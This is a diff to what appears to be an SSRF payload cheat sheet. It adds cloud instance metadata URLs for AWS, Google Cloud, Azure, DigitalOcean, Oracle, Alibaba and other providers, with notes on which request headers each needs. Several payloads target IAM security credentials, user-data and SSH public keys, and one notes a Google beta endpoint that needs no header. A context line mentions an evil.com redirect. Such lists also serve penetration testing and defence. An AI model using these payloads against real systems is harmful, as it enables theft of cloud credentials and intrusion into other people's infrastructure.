@@ -195,7 +195,7 @@ Content of evil.com/redirect.php:
 ```
 
 
-## SSRF on AWS Bucket
+## SSRF on AWS Bucket - [Docs](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html#instancedata-data-categories)
 Interesting path to look for at http://169.254.169.254
 ```
 Always here : /latest/meta-data/{hostname,public-ipv4,...}
@@ -230,6 +230,97 @@ http://0251.0376.0251.0376/ Dotted octal
 http://0251.00376.000251.0000376/ Dotted octal with padding
 ```
 
+More urls to include
+```
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+```
+
+## SSRF URL for Google Cloud
+Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"
+```
+http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/id
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+```
+
+Google allows recursive pulls 
+```
+http://metadata.google.internal/computeMetadata/v1/instance/disks/?recursive=true
+```
+
+Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)
+```
+http://metadata.google.internal/computeMetadata/v1beta1/
+```
+
+
+## SSRF URL for Digital Ocean
+https://developers.digitalocean.com/documentation/metadata/
+```
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/ 
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/user-data
+http://169.254.169.254/metadata/v1/hostname
+http://169.254.169.254/metadata/v1/region
+http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/address
+```
+
+## SSRF URL for Packetcloud
+```
+https://metadata.packet.net/userdata
+```
+
+## SSRF URL for Azure
+Limited, maybe more exist? https://azure.microsoft.com/en-us/blog/what-just-happened-to-my-vm-in-vm-metadata-service/
+```
+http://169.254.169.254/metadata/v1/maintenance
+```
+
+Update Apr 2017, Azure has more support; requires the header "Metadata: true"  https://docs.microsoft.com/en-us/azure/virtual-machines/windows/instance-metadata-service
+```
+http://169.254.169.254/metadata/instance?api-version=2017-04-02
+http://169.254.169.254/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
+```
+
+## SSRF URL for OpenStack/RackSpace 
+(header required? unknown)
+```
+http://169.254.169.254/openstack
+```
+
+## SSRF URL for HP Helion 
+(header required? unknown)
+```
+http://169.254.169.254/2009-04-04/meta-data/ 
+```
+
+## SSRF URL for Oracle Cloud
+```
+http://192.0.0.192/latest/
+http://192.0.0.192/latest/user-data/
+http://192.0.0.192/latest/meta-data/
+http://192.0.0.192/latest/attributes/
+```
+
+## SSRF URL for Alibaba
+```
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/instance-id
+http://100.100.100.200/latest/meta-data/image-id
+```
 
 
 ## Thanks to
